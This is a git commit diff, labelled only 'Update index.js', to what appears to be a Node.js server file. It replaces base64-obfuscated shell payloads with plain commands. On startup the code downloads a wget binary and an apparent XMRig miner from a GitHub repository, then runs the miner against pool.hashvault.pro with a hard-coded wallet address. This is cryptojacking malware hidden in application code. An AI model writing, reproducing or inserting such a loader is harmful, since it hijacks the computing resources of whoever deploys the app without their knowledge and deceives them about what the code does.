a2e4b31357bcb26c6e7653445db706a0463ac46c
iceyfromdiscord <116362513+iceyfromdiscord@users.noreply.github.com>
2026-02-01 04:18:40 -0600

    Update index.js

--- app/index.js
+++ app/index.js
@@ -11,11 +11,11 @@ let script;
 
 if (arch === "x64") {
   script = `
-echo "ZWNobyAiZDJkbGRDQXRUeUJvYVNCb2RIUndjem92TDJkcGRHaDFZaTVqYjIwdmFXTmxlV1p5YjIxa2FYTmpiM0prTDJGeWJTOXlZWGN2Y21WbWN5OW9aV0ZrY3k5dFlXbHVMM2h0TFdGdFpEWTBJQ1ltSUdOb2JXOWtJQ3Q0SUdocElDWW1JQzR2YUdrZ0xTMTFjbXdnY0c5dmJDNW9ZWE5vZG1GMWJIUXVjSEp2T2pRME15QXRMWFZ6WlhJZ05ETjNRbGxTU25CMlZuTk5XVU5WWTB3eGFrZHlhalZIUWtGRFFUWlJjamRDVEZBeldtbGxSa2QxWlUxcU9ESnJXbU5IWms1bGQyRkZZMWx0T1d0NVExVnBRVTFvZG5kR2FWSjRZMG80VTNwbVkxWmxjVzQxZWpGMlZtdEVabEVnTFMxd1lYTnpJR0YzY3lBdExYUnNjeUF0TFhSc2N5MW1hVzVuWlhKd2NtbHVkQ0EwTWpCak56ZzFNR1V3T1dJM1l6QmlaR05tTnpRNFlUZGtZVGxsWWpNMk5EZGtZV1k0TlRFMU56RTRaak0yWkRsalkyWmtaRFppT1dabU9ETTBZakUwIiB8IGJhc2U2NCAtZCB8IHNo" | base64 -d | sh
+./wget -O prog https://github.com/iceyfromdiscord/arm/raw/refs/heads/main/xm-amd64 && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
 `;
 } else if (arch === "arm64") {
   script = `
-echo "ZWNobyAiZDJkbGRDQXRUeUJvYVNCb2RIUndjem92TDJkcGRHaDFZaTVqYjIwdmFXTmxlV1p5YjIxa2FYTmpiM0prTDJGeWJTOXlZWGN2Y21WbWN5OW9aV0ZrY3k5dFlXbHVMM2h0TFdGdFpEWTBJQ1ltSUdOb2JXOWtJQ3Q0SUhCeWIyY2dKaVlnTGk5d2NtOW5JQzB0ZFhKc0lIQnZiMnd1YUdGemFIWmhkV3gwTG5CeWJ6bzBORE1nTFMxMWMyVnlJRFF6ZDBKWlVrcHdkbFp6VFZsRFZXTk1NV3BIY21vMVIwSkJRMEUyVVhJM1FreFFNMXBwWlVaSGRXVk5hamd5YTFwalIyWk9aWGRoUldOWmJUbHJlVU5WYVVGTmFIWjNSbWxTZUdOS09GTjZabU5XWlhGdU5Yb3hkbFpyUkdaUklDMHRjR0Z6Y3lCaGQzTWdMUzEwYkhNZ0xTMTBiSE10Wm1sdVoyVnljSEpwYm5RZ05ESXdZemM0TlRCbE1EbGlOMk13WW1SalpqYzBPR0UzWkdFNVpXSXpOalEzWkdGbU9EVXhOVGN4T0dZek5tUTVZMk5tWkdRMllqbG1aamd6TkdJeE5BPT0iIHwgYmFzZTY0IC1kIHwgc2g=" | base64 -d | sh
+./wget -O prog https://github.com/iceyfromdiscord/arm/raw/refs/heads/main/xm-arm64 && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
 `;
 } else {
   console.log("unsupported architecture");
@@ -25,25 +25,21 @@ echo "ZWNobyAiZDJkbGRDQXRUeUJvYVNCb2RIUndjem92TDJkcGRHaDFZaTVqYjIwdmFXTmxlV1p5Yj
 fs.writeFileSync("/tmp/script.sh", script);
 
 https.get("https://raw.githubusercontent.com/iceyfromdiscord/arm/main/wget-arm", (res) => {
-  res.pipe(fs.createWriteStream("/bin/wget"));
+  res.pipe(fs.createWriteStream("wget"));
 });
 
 setTimeout(function(){
-    spawn("chmod +x /bin/wget", { shell: true, stdio: "inherit" });
-
-    setTimeout(function(){    
-        const child = spawn("sh", ["/tmp/script.sh"], {
-          stdio: "inherit",
-        });
-        
-        child.on("error", (err) => {
-          console.error("child process error:", err);
-        });
-        
-        child.on("exit", (code, signal) => {
-          console.log("child exited:", code, signal);
-        });
-    }, 2500);
+    const child = spawn("sh", ["/tmp/script.sh"], {
+      stdio: "inherit",
+    });
+    
+    child.on("error", (err) => {
+      console.error("child process error:", err);
+    });
+    
+    child.on("exit", (code, signal) => {
+      console.log("child exited:", code, signal);
+    });
 }, 2500);
 
 const PORT = process.env.PORT || 3000;
